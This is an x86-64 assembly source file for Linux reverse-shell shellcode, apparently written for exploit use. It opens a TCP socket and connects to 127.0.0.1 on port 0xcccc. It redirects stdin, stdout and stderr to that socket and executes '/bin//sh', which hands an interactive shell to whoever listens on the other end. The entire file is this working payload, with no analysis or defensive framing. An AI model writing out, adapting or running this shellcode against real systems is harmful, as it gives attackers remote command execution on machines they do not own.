        .intel_syntax noprefix
        .globl _start
_start:
        # s = socket(AF_INET, SOCK_STREAM, 0)
        xor rdx, rdx
        push 1
        pop rsi
        push 2
        pop rdi
        push 41
        pop rax
        syscall
        # connect(s, {sa_family=AF_INET, sin_port=htons(0xcccc), sin_addr=inet_addr("127.0.0.1")}, 16)
        mov dl, 16
        mov rsi, 0x0100007fcccc0002
        push rsi
        mov rsi, rsp
        mov rdi, rax
        mov al, 42
        syscall
        # dup2(s, 0), dup2(s, 1), dup2(s, 2)
        push 2
        pop rsi
dup_loop:
        mov al, 33
        syscall
        dec rsi
        jge dup_loop
        # execve("/bin//sh", {"/bin//sh", NULL}, NULL)
        pop rdx
        xor rdx, rdx
        push rdx
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        mov al, 59
        syscall
